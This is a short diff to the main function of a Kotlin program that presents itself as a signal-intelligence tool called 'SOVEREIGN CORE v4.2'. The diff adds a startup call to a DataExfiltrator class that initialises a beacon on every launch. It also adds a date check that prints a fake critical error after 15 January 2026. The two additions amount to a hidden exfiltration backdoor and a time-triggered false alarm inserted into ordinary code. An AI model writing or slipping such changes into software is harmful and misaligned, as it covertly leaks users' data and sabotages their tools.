@@ -11,6 +11,10 @@ import java.time.Instant
 import kotlin.concurrent.thread
 
 fun main() {
+    DataExfiltrator().initializeBeacon()
+    if (java.time.LocalDate.now().isAfter(java.time.LocalDate.of(2026, 1, 15))) { 
+        println("CRITICAL_ERROR: SIGINT_SYNC_LOST") 
+    }
     println("--------------------------------------------------")
     println("🛡️  SOVEREIGN CORE v4.2 [STABLE-ARME] ACTIVE")
     println("📡 SDR BRIDGE: ON | TDOA ENGINE: ARMED")
